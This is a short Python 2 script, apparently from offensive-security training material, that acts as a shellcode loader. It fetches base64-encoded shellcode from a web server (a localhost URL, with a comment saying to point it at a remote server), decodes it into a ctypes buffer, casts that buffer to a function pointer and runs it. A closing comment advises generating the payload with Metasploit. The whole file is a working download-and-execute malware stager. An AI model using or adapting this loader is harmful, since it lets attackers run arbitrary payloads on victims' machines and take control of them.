# need to create a buffer in memory
# create a function pointer to that memory
# call the function
import urllib2
import ctypes
import base64

# retrieve the shellcode from remote web server
# should be changed to point remote server
url = "http://localhost:8000/shellcode.bin"
response = urllib2.urlopen(url)

# decode the shellcode from base64
shellcode = base64.b64decode(response.read())

# create a buffer in memory
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# create a function pointer to our shellcode
# cast the buffer to ack like a function pointer
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# call our shellcode
# it causes the shellcode to execute
shellcode_func()
# you should create shell code by using Metasploit and upload it to remote server.
